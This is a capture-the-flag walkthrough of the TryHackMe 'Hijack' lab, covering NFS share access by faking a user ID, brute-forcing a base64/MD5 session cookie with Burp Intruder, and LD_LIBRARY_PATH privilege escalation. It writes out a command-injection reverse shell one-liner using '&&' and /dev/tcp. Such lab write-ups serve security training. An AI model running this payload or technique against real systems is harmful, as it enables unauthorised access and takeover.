# HIJACK 
![hij](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/15bc4df0-d4e6-471a-ac09-a0538e5d9787)

Link: [Hijack](https://tryhackme.com/r/room/hijack)

## Enumeration
- An NMAP scan reveals that a number of services are running on the open ports of the system.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/390f58ff-5d36-478d-afe1-eed8c69a6960)
![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/1f0abcb4-5a76-4662-b4df-9cc4e5a8d1df)

- The services of interest are FTP on port 21, ssh on port 22, http on port 80 and nfs on port 2049. From the NMAP results, FTP does not allow anonymous login. Let's take a look at the website on port 80.
 
![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/9e2413bf-1f35-47ff-965e-602ad9aea043)
![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/d9514ecd-4def-4110-888a-81f34574b6d4)

- The website has an admin panel that cannot be accessed because you do not have the rights to do so. You can run a gobuster scan to find if there are hidden directories in the website. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/73f91c4a-5fdf-49f5-a615-240ed8ffc525)

- The results of the gobuster scan shows that there are no hidden directories of interest. One of the services running on the target machine is NFS. You can list the shares on the target using the command;

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/8d14f2f9-37a8-4b30-bf4a-bf879c1ce525)

- There is only one share on the system which you can mount to your machine and try to find any helpful information that can allow you to access the machine.
 
![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/63027d01-158e-45ac-9e6f-301948d5e4c6)

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/52d95a9e-0bfb-4787-9b3c-a5d98b9aed91)

- You cannpt access the mounted share since you are not the owner. You can see that the share is owned by the user (hj_1003). This means that you will have to create the user hj_1003 on your system and switch to that user so that you can access the share. You can do so using the command;

  `sudo adduser hj_1003` 

  and then set the password using the command;

  `passwd hj_1003`

- Now switch to this user and view the contents of the share. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/90676514-2832-4664-ac78-e29900d684db)

- You get FTP credentials which you can now use to log into FTP. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/ea576b65-4064-4343-98a9-d2b1372220ca)

- There are two files of interest here: `.passwords_list.txt` and `from_admin.txt`

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/be6169a8-b083-4ecb-8583-16110bad5091)

- The contents of the latter file reveals that the admin is using one of the passwords from the list. It also reveals that there is another user known as `rick`. With this information, it's time to pay another visit to the website and play around with it.


## Initial Foothold
-Trying to log into the website using the username `admin` and the password `admin` reveals that a user with this name exists but the password is incorrect. Trying this multiple times using default passwords reveals that you only have 5 tries before the system locks you out for 300 seconds.
-You can now try and create a user account to see if there are any parameters, such as cookies, that are present for a user.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/14d4b92e-6253-480b-8875-90ec8c02f3c2)

- You find that there is indeed a cookie for the user that is logged in. Examining this cookies reveals that it is encoded in base64. By decoding it, it can be seen that the cookie is in the format `user:password` where the password is hashed in MD5. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/6bb348c5-b3f3-4438-9b9e-041e48e54738)

- With the password wordlist obtained from ftp, you can now bruteforce into the system using Intruder on Burpsuite. You can reload the logged in page of the user you created, capture this on Proxy, send it to Intruder and add the wordlist as well as rules for processing. For the cookie to be created, the password is hashed in MD5, the username is appended to this and then the result is encoded in base64. The rules should reflect this in this exact order.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/79990717-2399-4429-af8b-b7132cfb5d27)

- Click on the result that has a different time length than the rest. This is the cookie for the admin panel.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/329f149d-ead7-4907-985d-9382596a6a5c)

- Now you can log into the account you created and change the cookie to this value. You now have access to the admin panel where you can check the status of a service. 

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/cf01b1d8-4ae7-459c-9b96-5aba8be52d5e)

- While here, you can try to inject a command that gives you a reverse shell. I tried using a semi-colon after inputting ftp but the system detected this as a command injection. The other option is to use `&&` where the second commnad is executed only after the first is completed. With this, you can perform command injection as such to get a reverse shell;

`ftp && bash -c "bash -i >& /dev/tcp/ip/port 0>&1"` where ip is your listening IP and port is your netcat listening port and executing this gives you a shell

- Viewing the contents of `config.php` reveals credentials for the user rick which you can ssh into.
- Now, you can get your first flag.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/485fe627-1853-4637-a633-22b2a2c39a63)


## Privilege Escalation
- Now, let's try to gain a root shell. The first vector I usually try is `sudo -l`. Luckily, that gets us a relevant vector for privesc in this case.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/52762bb7-c521-4165-bf12-28337186ea82)

- You can leverage the LD_LIBRARY_PATH environment variable to gain a root shell. This is outlined well [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation?source=post_page-----65e9d2b1a717--------------------------------#ld_preload-and-ld_library_path).
- The steps are as shown below. Copy the code provided into a c file (shell.c). Compile the code as is shown and then run the code and append the sudo command that `rick` is allowed to run on the system.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/6339dbab-0d14-4ea1-a9bf-2231e7866d0d)

- This gives you a root shell through which you can get the second flag.

![image](https://github.com/LadyCaldlow/LadyCaldlow.github.io/assets/162819648/6cd0b7a6-d6e4-43ee-b5c5-8b8d28513e54)

